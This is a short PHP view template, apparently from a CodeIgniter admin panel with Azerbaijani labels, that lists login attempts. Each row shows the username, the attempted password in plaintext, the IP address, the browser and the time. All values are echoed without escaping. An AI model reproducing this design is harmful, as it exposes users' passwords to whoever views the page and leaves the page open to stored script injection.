<!-- Main content -->
  <section class="content">
    <div class="row">
      <div class="col-xs-12">

        <div class="box">
          <div class="box-header">
            <h3 class="box-title">Cəhdlər</h3>
            
          </div>
          <?php echo $this->session->flashdata('update_datatable'); ?>
          <div class="box-body">
            <table id="example1" class="table table-bordered table-striped">
              <thead>
              <tr>
               
               <th style="width: 20px;">№</th>
                <th>İstifadəçi adı</th>

                <th>Şifrə</th>
               
                <th>İP</th>
              
                <th>Platforma</th>

                <th>Vaxt</th>
               
              </tr>
              </thead>
              <tbody>
              <?php $count = 1; foreach ($details as $detail) { ?>
              <tr>
                 <td><?php echo $count++ ?></td>
                 <td><?php echo $detail['username'] ; ?></td>
              
                 <td><?php echo $detail['password'] ; ?></td>
            
                 <td><?php echo $detail['ip'] ; ?></td>
                
                 <td><?php echo $detail['browser'] ; ?></td>

                 <td><?php echo $detail['date'] ; ?></td>
               
              </tr>
           <?php } ?>
            </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  </section>
